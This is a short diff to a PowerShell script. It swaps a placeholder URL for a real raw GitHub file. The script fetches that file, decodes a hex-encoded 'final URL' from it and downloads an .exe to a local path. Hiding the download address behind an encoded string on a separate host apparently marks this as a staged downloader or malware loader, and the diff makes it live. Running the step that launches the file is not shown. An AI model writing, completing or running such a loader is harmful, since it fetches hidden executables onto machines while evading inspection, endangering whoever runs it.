@@ -46,7 +46,7 @@ Function Convert-HexToText {
 
 
 # URL of the hosted text file
-$url = "https://yourtextfileurl.com" # Replace this with the actual URL containing the custom encoded string
+$url = "https://raw.githubusercontent.com/notforuseactually/404/main/1.txt" # Replace this with the actual URL containing the custom encoded string
 
 # Use Invoke-RestMethod to fetch the content from the URL
 $rawText = Invoke-RestMethod -Uri $url -ErrorAction Stop
@@ -79,7 +79,7 @@ Write-Host "Final URL from hex:"
 Write-Host $finalUrl
 
 # Specify the location where the file will be downloaded
-$downloadPath = "C:\Path\To\DownloadedFile.exe" # Change to your desired path and filename
+$downloadPath = "S:\DownloadedFile.exe" # Change to your desired path and filename
 
 # Function to download the file from the URL
 Function Download-File {
